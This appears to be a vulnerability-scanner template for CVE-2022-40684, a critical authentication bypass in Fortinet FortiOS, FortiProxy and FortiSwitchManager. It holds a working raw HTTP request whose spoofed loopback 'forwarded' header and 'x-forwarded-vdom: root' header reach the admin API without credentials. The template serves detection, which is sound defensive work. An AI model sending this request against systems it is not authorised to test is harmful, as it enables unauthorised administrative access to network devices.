id: CVE-2022-40684

info:
  name: Fortigate - Authentication bypass 
  author: carlosvieira
  severity: critical
  description: |
    An authentication bypass using an alternate path or channel vulnerability [CWE-288] in FortiOS, FortiProxy and FortiSwitchManager may allow an unauthenticated atttacker to perform operations on the administrative interface via specially crafted HTTP or HTTPS requests.
  reference:
    - https://www.fortiguard.com/psirt/FG-IR-22-377
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:F/RL:U/RC:C
    cvss-score: 9.8
    cve-id: CVE-2022-40684 
  metadata:
    verified: "true"
  tags: cve,cve2022,fortinet,fortigate,fortios,fortiproxy

requests:
  - raw:
      - |
        GET /api/v2/cmdb/system/admin HTTP/1.1
        User-Agent: Node.js
        accept-encoding: gzip, deflate
        Host: {{Hostname}}
        forwarded: by="[127.0.0.1]:1337";for="[127.0.0.1]:1337";proto=http;host=
        x-forwarded-vdom: root
        Connection: close
    redirects: true
    max-redirects: 5
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "ENC XXXX"
          - http_method

      - type: status
        status:
          - 200